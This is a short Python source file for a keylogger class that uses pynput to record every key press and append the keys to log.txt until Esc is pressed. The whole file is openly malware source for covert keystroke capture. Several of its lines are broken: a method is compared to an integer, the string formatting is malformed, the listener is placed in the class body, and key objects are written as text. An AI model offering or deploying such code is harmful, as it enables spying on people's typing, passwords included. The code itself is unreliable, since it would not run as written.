'''Need a Copyright.? Why anyways all are copy pasted'''

from pynput.keyboard import Key, Listener


class Keylogs:
    '''logger class'''

    def __init__(self) -> None:
        self.count = 0
        self.keys = []

    def on_press(self, key):
        '''what happens is recorded in on_press'''
        self.keys.append(key)
        self.count = self.count+1
        print(f"{0} pressed".format(key))
        if self.keys.count > 10:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, keys):
        '''write file in log text'''
        with open("log.txt", "a", encoding='UTF-8') as inputfile:
            for key in keys:
                inputfile.write(key)

    def on_release(self, key):
        '''release the key'''
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
